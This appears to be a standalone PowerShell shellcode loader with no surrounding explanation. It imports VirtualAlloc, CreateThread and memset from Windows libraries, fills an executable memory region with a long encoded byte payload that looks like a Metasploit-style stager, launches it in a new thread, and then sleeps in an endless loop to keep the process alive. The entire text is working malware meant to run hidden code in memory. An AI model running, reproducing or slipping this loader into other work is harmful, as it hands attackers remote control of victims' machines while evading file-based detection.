$UBO = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $UBO -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xce,0xd9,0x74,0x24,0xf4,0xb8,0xce,0xa2,0x24,0xa1,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x18,0x83,0xc2,0x04,0x03,0x42,0xda,0x40,0xd1,0x5d,0x0a,0x06,0x1a,0x9e,0xca,0x67,0x92,0x7b,0xfb,0xa7,0xc0,0x08,0xab,0x17,0x82,0x5d,0x47,0xd3,0xc6,0x75,0xdc,0x91,0xce,0x7a,0x55,0x1f,0x29,0xb4,0x66,0x0c,0x09,0xd7,0xe4,0x4f,0x5e,0x37,0xd5,0x9f,0x93,0x36,0x12,0xfd,0x5e,0x6a,0xcb,0x89,0xcd,0x9b,0x78,0xc7,0xcd,0x10,0x32,0xc9,0x55,0xc4,0x82,0xe8,0x74,0x5b,0x99,0xb2,0x56,0x5d,0x4e,0xcf,0xde,0x45,0x93,0xea,0xa9,0xfe,0x67,0x80,0x2b,0xd7,0xb6,0x69,0x87,0x16,0x77,0x98,0xd9,0x5f,0xbf,0x43,0xac,0xa9,0xbc,0xfe,0xb7,0x6d,0xbf,0x24,0x3d,0x76,0x67,0xae,0xe5,0x52,0x96,0x63,0x73,0x10,0x94,0xc8,0xf7,0x7e,0xb8,0xcf,0xd4,0xf4,0xc4,0x44,0xdb,0xda,0x4d,0x1e,0xf8,0xfe,0x16,0xc4,0x61,0xa6,0xf2,0xab,0x9e,0xb8,0x5d,0x13,0x3b,0xb2,0x73,0x40,0x36,0x99,0x1b,0xa5,0x7b,0x22,0xdb,0xa1,0x0c,0x51,0xe9,0x6e,0xa7,0xfd,0x41,0xe6,0x61,0xf9,0xa6,0xdd,0xd6,0x95,0x59,0xde,0x26,0xbf,0x9d,0x8a,0x76,0xd7,0x34,0xb3,0x1c,0x27,0xb9,0x66,0x88,0x22,0x2d,0xb3,0xf6,0x8d,0x76,0xab,0x0a,0xce,0xde,0xf6,0x82,0x28,0x8e,0x56,0xc5,0xe4,0x6e,0x07,0xa5,0x54,0x06,0x4d,0x2a,0x8a,0x36,0x6e,0xe0,0xa3,0xdc,0x81,0x5d,0x9b,0x48,0x3b,0xc4,0x57,0xe9,0xc4,0xd2,0x1d,0x29,0x4e,0xd1,0xe2,0xe7,0xa7,0x9c,0xf0,0x9f,0x47,0xeb,0xab,0x09,0x57,0xc1,0xc6,0xb5,0xcd,0xee,0x40,0xe2,0x79,0xed,0xb5,0xc4,0x25,0x0e,0x90,0x5f,0xef,0x9a,0x5b,0x37,0x10,0x4b,0x5c,0xc7,0x46,0x01,0x5c,0xaf,0x3e,0x71,0x0f,0xca,0x40,0xac,0x23,0x47,0xd5,0x4f,0x12,0x34,0x7e,0x38,0x98,0x63,0x48,0xe7,0x63,0x46,0x48,0xdb,0xb5,0xae,0x3e,0x35,0x06;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$52Zx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($52Zx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$52Zx,0,0,0);for (;;){Start-sleep 60};
